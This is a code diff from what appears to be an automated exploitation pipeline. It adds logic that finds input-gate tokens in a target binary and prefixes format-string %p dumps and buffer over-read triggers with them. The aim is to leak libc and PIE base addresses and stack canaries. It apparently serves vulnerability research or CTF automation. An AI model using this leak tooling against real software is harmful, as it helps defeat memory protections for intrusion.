@@ -1145,8 +1145,54 @@ def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
     }
 
 
+def _gate_preambles(target_bytes=b"", strings=(), known_inputs=(), cap=6) -> list:
+    """Candidate byte strings that pass a program's INPUT GATE, so a leak trigger sent AFTER them
+    actually reaches the leaking sink.
+
+    A leak behind a gate -- `strstr(input, "TOKEN")`, a required banner reply, a password/menu
+    prompt -- is never reached when the trigger is the first thing written: the program rejects it
+    and exits before the leaking printf / over-read, so the provocation silently fails on exactly
+    the interactive targets that most need it (e.g. a `strstr(input,"TOKEN")`
+    gate guards the `printf("...%s", input)` that discloses the stack). Mined from (1) known
+    gate-passing inputs the pipeline already found -- the leading printable run of a concolic/fuzz
+    crash input that reached the bug -- and (2) the binary's own selective strings, since a gate
+    token is almost always a literal in the image. Deduped and bounded; each is tried as the start
+    of a leak trigger (a single write, for a gate that reads the whole line) by the caller."""
+    import re as _re
+    out: list = []
+    seen: set = set()
+
+    def _add(b: bytes):
+        b = bytes(b).rstrip(b"\x00")
+        if b and b not in seen and 2 <= len(b) <= 64:
+            seen.add(b)
+            out.append(b)
+
+    for ki in known_inputs or ():                        # leading printable run of a solved input
+        run = bytearray()
+        for ch in bytes(ki):
+            if 0x20 <= ch < 0x7f:
+                run.append(ch)
+            else:
+                break
+        if len(run) >= 2:
+            _add(bytes(run))
+    svals = list(strings or ())
+    if not svals and target_bytes:                       # fall back to the image's own strings
+        svals = [m.group(0).decode("latin-1") for m in _re.finditer(rb"[ -~]{3,48}", target_bytes)]
+    for s in svals:
+        s = (s if isinstance(s, str) else s.decode("latin-1", "ignore")).strip()
+        # a plausible gate token: wordy, not a format/path/flag fragment
+        if 3 <= len(s) <= 48 and any(c.isalpha() for c in s) \
+                and not s.startswith(("%", "/", "-", ".")) and "%" not in s:
+            _add(s.encode("latin-1", "ignore"))
+        if len(out) >= cap:
+            break
+    return out[:cap]
+
+
 def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=6.0,
-                      mem_mb=2048, read_cap=64) -> dict:
+                      mem_mb=2048, read_cap=64, strings=(), known_inputs=()) -> dict:
     """Best-effort automatic leak: drive the target with a format-string `%p` dump (sequential that
     fits `read_cap`, then positional to reach deeper slots) and classify what comes back. Returns
     the classification plus the winning trigger, or empties when nothing was disclosed (the target
@@ -1173,6 +1219,13 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
     # leak with no printf(user) sink at all. Sent WITHOUT a trailing newline so a raw read(fd,buf,N)
     # returns the moment the buffer is full; several sizes cover the unknown buffer length.
     triggers += [b"A" * n for n in (64, 128, 256)]
+    # Gate-aware variants: prefix the over-read fills and the %p dump with each candidate gate
+    # token, so the SAME input both passes an input gate (strstr(input,"TOKEN"), a banner reply)
+    # and provokes the leak -- the sink behind the gate is otherwise never reached. The leaking
+    # sink usually operates on this very input (printf("...%s", input)), so a single write suffices.
+    for g in _gate_preambles(target_bytes, strings=strings, known_inputs=known_inputs):
+        triggers += [g + b"A" * n for n in (64, 128, 256)]
+        triggers.append((g + seq)[:read_cap] + b"\n")
     best = {"pie_base": None, "libc_base": None, "canary": None, "trigger": None, "dump": b""}
     for trig in triggers:
         preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
